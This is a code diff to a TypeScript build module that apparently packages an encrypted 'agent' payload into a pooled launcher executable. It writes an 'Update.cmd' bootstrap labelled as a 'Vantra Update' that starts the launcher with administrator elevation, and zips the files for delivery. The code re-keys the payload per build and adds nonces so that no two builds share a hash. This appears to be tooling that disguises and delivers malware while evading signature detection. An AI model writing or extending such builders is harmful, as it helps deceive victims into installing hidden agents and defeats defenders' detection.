@@ -5,24 +5,23 @@
  * launcher from the pool, seals a fresh per-build envelope
  * (K_B ‖ IV_PAY ‖ IV_CFG ‖ CK) with the launcher's compile-time seal, re-keys
  * the cached payload and builds the URL-query config under K_B, appends
- * [hdr][env][cfg][pay][trailer] to the pooled exe, writes Update.lnk (a
- * RELATIVE-Launcher.exe shortcut with zero arguments) beside it, zips the pair
- * into the job dir, then runs the WP6 validation report card (pwsh -Validate
- * + server-side checks). Nothing is downloaded or fetched at build time; the
- * payload plaintext lives only in memory.
+ * [hdr][env][cfg][pay][trailer] to the pooled exe, writes a portable Update.cmd
+ * bootstrap ("start \"\" \"%~dp0Launcher.exe\"", resolves from any extract
+ * folder) beside it, zips the triple { Update.cmd, Launcher.exe, agent.bin }
+ * into the job dir, then runs the WP6 validation report card (server-side
+ * checks). Nothing is downloaded or fetched at build time; the payload
+ * plaintext lives only in memory.
  */
 
 import * as crypto from "crypto";
 import * as fs from "fs";
 import * as path from "path";
-import { spawn } from "child_process";
 import * as storage from "./storage";
 import * as payloadCache from "./payload-cache";
 import * as launcherPool from "./launcher-pool";
 import { createZip } from "./zip-archive";
 import { validateLauncherBuild } from "./launcher-validate";
 import { HDR_LEN, ENV_LEN, assembleOverlay, buildAgentBin } from "./launcher-overlay";
-import { env } from "./env";
 
 export { HDR_LEN, ENV_LEN };
 
@@ -44,20 +43,18 @@ export interface LauncherBuildInputs {
 export interface LauncherRunOutput {
   zip: Buffer;
   stampedExe: Buffer;
-  lnk: Buffer;
+  cmd: Buffer; // portable Update.cmd bootstrap
   tag: string;
   launcherSha256: string;
-  lnkSha256: string;
+  cmdSha256: string;
   overlay: Buffer;
   configText: string;
 }
 
-const LNK_TIMEOUT_MS = 120000; // pwsh New-AgentShortcut.ps1 (mirrors runZipBuild)
-
-// Per-build diversity tracking: a build whose stamped launcher or Update.lnk
+// Per-build diversity tracking: a build whose stamped launcher or Update.cmd
 // byte-matches the previous build's (astronomically unlikely) is rejected.
 let lastLauncherSha256: string | null = null;
-let lastLnkSha256: string | null = null;
+let lastCmdSha256: string | null = null;
 
 function sha256Hex(data: Buffer): string {
   return crypto.createHash("sha256").update(data).digest("hex");
@@ -77,44 +74,6 @@ export function buildConfigString(c: LauncherBuildInputs): string {
     `outDir=${enc(c.outDir)}`,
     `debug=${c.debug ? "1" : "0"}`,
   ].join("&");
-}
-
-interface PwshResult {
-  ok: boolean;
-  output: string;
-}
-
-function runPwsh(args: string[]): Promise<PwshResult> {
-  return new Promise((resolve) => {
-    try {
-      let stdout = "";
-      let stderr = "";
-      const proc = spawn("pwsh", ["-NoProfile", "-NoLogo", "-File", ...args], {
-        timeout: LNK_TIMEOUT_MS,
-      });
-      proc.stdout?.on("data", (d: Buffer) => (stdout += d.toString()));
-      proc.stderr?.on("data", (d: Buffer) => (stderr += d.toString()));
-      proc.on("error", (err: Error) =>
-        resolve({ ok: false, output: err.message })
-      );
-      proc.on("close", (code: number | null) => {
-        if (code === 0) resolve({ ok: true, output: stdout });
-        else if (code === null)
-          resolve({
-            ok: false,
-            output: `launcher .lnk build timed out after ${LNK_TIMEOUT_MS / 1000}s`,
-          });
-        else {
-          const tail =
-            stderr.length > 500 ? stderr.slice(-500) : stderr || stdout;
-          resolve({ ok: false, output: tail });
-        }
-      });
-    } catch (err) {
-      const message = err instanceof Error ? err.message : String(err);
-      resolve({ ok: false, output: message });
-    }
-  });
 }
 
 /**
@@ -179,48 +138,44 @@ export async function runLauncherBuild(opts: {
     );
   }
   const launcherPath = storage.launcherOutputPath(jobId);
-  const lnkPath = storage.lnkRelativeOutputPath(jobId);
+  const cmdPath = storage.cmdBootstrapOutputPath(jobId);
   const agentBinPath = storage.agentBinOutputPath(jobId);
   fs.writeFileSync(launcherPath, stampedExe);
   fs.writeFileSync(agentBinPath, agentBin);
 
-  // 5. Update.lnk — Launcher.exe target, zero arguments, ShowCommand 7.
-  //    Uses env.LAUNCHER_LNK_TARGET (absolute path) when set -> a normal
-  //    absolute LinkInfo so Explorer reliably double-clicks -> UAC. Falls back
-  //    to a bare relative "Launcher.exe" otherwise.
-  const lnkTarget = env.LAUNCHER_LNK_TARGET || "Launcher.exe";
-  const lnkResult = await runPwsh([
-    path.join(__dirname, "New-AgentShortcut.ps1"),
-    "-LauncherMode",
-    "-Output",
-    lnkPath,
-    "-LauncherTarget",
-    lnkTarget,
-    "-LauncherTag",
-    entry.tag,
-  ]);
-  if (!lnkResult.ok) {
-    throw new Error(`Update.lnk build failed: ${lnkResult.output}`);
-  }
-  if (!fs.existsSync(lnkPath)) {
-    throw new Error("Update.lnk was not produced");
-  }
-  const lnk = fs.readFileSync(lnkPath);
+  // 5. Portable Update.cmd bootstrap — FIX 1. A bare relative .lnk does NOT
+  //    resolve on this host (Explorer double-click -> "No application is
+  //    associated"; WScript read an empty target), so the shipped entry is a
+  //    real .cmd that locates Launcher.exe via %~dp0 (its own folder) from any
+  //    extract folder (Downloads/Desktop/anywhere). Launcher.exe carries
+  //    requireAdministrator -> still raises UAC. A per-build `rem` nonce keeps
+  //    the file byte-unique per build (diversity guard), like the old .lnk tag.
+  const tagPart = entry.tag.slice(0, 8);
+  const updateCmd = Buffer.from(
+    [
+      "@echo off",
+      `rem Vantra Update bootstrap -- build ${tagPart}`,
+      `start "" "%~dp0Launcher.exe"`,
+      "",
+    ].join("\r\n"),
+    "utf8"
+  );
+  fs.writeFileSync(cmdPath, updateCmd);
 
-  // 6. zip { Update.lnk, Launcher.exe, agent.bin } (temp files stay until validation).
+  // 6. zip { Update.cmd, Launcher.exe, agent.bin } (temp files stay until validation).
   const zip = createZip([
-    { name: "Update.lnk", data: lnk },
+    { name: "Update.cmd", data: updateCmd },
     { name: "Launcher.exe", data: stampedExe },
     { name: "agent.bin", data: agentBin },
   ]);
   const zipPath = storage.zipOutputPath(jobId);
   fs.writeFileSync(zipPath, zip);
 
-  // 7. WP6 validation report card (pwsh -Validate + server-side checks).
+  // 7. WP6 validation report card (server-side checks).
   const lzHash = sha256Hex(stampedExe);
-  const lnkHash = sha256Hex(lnk);
+  const cmdHash = sha256Hex(updateCmd);
   const validation = await validateLauncherBuild({
-    lnkPath,
+    cmdPath,
     launcherPath,
     zipPath,
     authToken: inputs.authToken,
@@ -229,16 +184,16 @@ export async function runLauncherBuild(opts: {
     sealIv,
     agentBin,
     prevLauncherHash: lastLauncherSha256,
-    prevLnkHash: lastLnkSha256,
+    prevCmdHash: lastCmdSha256,
   });
   for (const row of validation.rows) console.log(`  [validate] ${row}`);
   if (!validation.ok) {
     throw new Error("Launcher build failed validation — job aborted");
   }
-  // Task D: the zip is kept until expiry; drop the temp Update.lnk + Launcher.exe.
+  // Task D: the zip is kept until expiry; drop the temp Update.cmd + Launcher.exe.
   storage.removeLauncherTemp(jobId);
   lastLauncherSha256 = lzHash;
-  lastLnkSha256 = lnkHash;
+  lastCmdSha256 = cmdHash;
 
   console.log(
     `Launcher build ok for job ${jobId}; launcher=${stampedExe.length}B ` +
@@ -249,10 +204,10 @@ export async function runLauncherBuild(opts: {
   return {
     zip,
     stampedExe,
-    lnk,
+    cmd: updateCmd,
     tag: entry.tag,
     launcherSha256: lzHash,
-    lnkSha256: lnkHash,
+    cmdSha256: cmdHash,
     overlay,
     configText,
   };
